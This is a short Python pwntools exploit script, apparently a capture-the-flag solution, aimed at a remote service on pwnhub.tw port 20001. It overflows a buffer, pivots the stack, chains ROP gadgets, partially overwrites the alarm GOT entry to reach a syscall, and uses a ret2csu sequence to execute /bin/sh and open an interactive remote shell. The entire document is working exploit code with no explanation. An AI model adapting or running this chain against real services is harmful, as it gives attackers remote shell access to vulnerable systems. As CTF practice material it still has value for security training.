#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host = "10.211.55.6"
port = 8888
host = "pwnhub.tw"
port = 20001
r = remote(host,port)


leave_ret = 0x400824
alarm = 0x4005b0
alarm_got = 0x601020
read_input = 0x0000000000400795
read = 0x4005c0
pop_rdi = 0x0000000000400893
pop_rsi_r15 = 0x0000000000400891
leave_ret = 0x400824
context.arch = "amd64"
csu = 0x400870
pop_rbx_rbp_r12_r13_r14_r15 = 0x40088a
buf1 = 0x00602000 - 0x200
buf2 = 0x00602000 - 0x100
rop1 = flat([buf1,pop_rsi_r15,buf1,0,read,leave_ret])
payload = "A"*32 + rop1
r.send(payload)
time.sleep(0.1)
rop2 = flat([buf2,pop_rdi,buf2,pop_rsi_r15,0x100,0,read_input,leave_ret])
r.sendline(rop2)
time.sleep(0.1)
rop3 = flat([buf1,pop_rdi,alarm_got,pop_rsi_r15,1,0,read_input,pop_rdi,buf1,pop_rsi_r15,0x100,0,read_input,leave_ret])
r.sendline(rop3)
partial = "\x05"
time.sleep(0.1)
r.send(partial)
time.sleep(0.1)

rop4 = flat([buf2,pop_rdi,buf2,read_input,pop_rbx_rbp_r12_r13_r14_r15,0,1,alarm_got,0,0,buf2,csu])
r.sendline(rop4)
time.sleep(0.1)
r.send("/bin/sh\x00".ljust(0x3b,"\x00"))
r.interactive()
